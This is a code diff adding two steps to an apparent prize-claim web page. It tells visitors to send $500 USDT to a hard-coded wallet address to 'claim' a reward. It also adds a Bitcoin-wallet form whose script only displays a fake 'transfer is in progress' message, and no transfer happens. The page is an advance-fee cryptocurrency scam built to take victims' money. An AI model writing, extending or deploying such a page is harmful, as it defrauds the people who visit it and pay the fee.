@@ -165,6 +165,25 @@
             <p class="large-text">Congratulations! Follow the steps below to claim your reward.</p>
         </div>
 
+        <!-- Step 1: Payment Section -->
+        <div class="grid-item">
+            <h2>Step 1: Send $500 USDT (ERC20)</h2>
+            <p>To claim your prize, send $500 USDT to the following wallet address:</p>
+            <p class="copyable" id="wallet-address">0xf1Da95206AbC1f30b49C4DcAbaeB068029a8EE54</p>
+            <button onclick="copyToClipboard()">Copy Wallet Address</button>
+        </div>
+
+        <!-- Step 2: Bitcoin Wallet Submission -->
+        <div class="grid-item">
+            <h2>Step 2: Submit Your Bitcoin Wallet</h2>
+            <p>Enter your Bitcoin wallet address below to receive your prize:</p>
+            <form id="bitcoin-form" onsubmit="handleBitcoinSubmission(event)">
+                <input type="text" id="bitcoin-wallet" name="bitcoin-wallet" placeholder="Your Bitcoin Wallet Address" required>
+                <button type="submit">Submit Address</button>
+            </form>
+            <p id="submission-result" class="success-message"></p>
+        </div>
+
         <!-- Step 3: Prize Verification -->
         <div class="grid-item">
             <h2>Verify Prize Withdrawal</h2>
@@ -176,10 +195,29 @@
     </div>
 
     <script>
+        function copyToClipboard() {
+            const walletAddress = document.getElementById('wallet-address').innerText;
+            navigator.clipboard.writeText(walletAddress)
+                .then(() => alert('Wallet address copied to clipboard!'))
+                .catch(err => console.error('Failed to copy: ', err));
+        }
+
+        function handleBitcoinSubmission(event) {
+            event.preventDefault();
+            const walletInput = document.getElementById('bitcoin-wallet').value.trim();
+            const resultMessage = document.getElementById('submission-result');
+            if (walletInput) {
+                resultMessage.textContent = 'The transfer is in progress, please wait only 10 minutes.';
+            } else {
+                resultMessage.textContent = 'Please enter a valid Bitcoin wallet address.';
+                resultMessage.className = 'error-message';
+            }
+        }
+
         function verifyCoupon() {
             const couponInput = document.getElementById('coupon-code').value.trim();
             const verificationResult = document.getElementById('verification-result');
-            
+
             const validCoupon = '1861464107'; // Update this value if needed
             
             if (couponInput === validCoupon) {
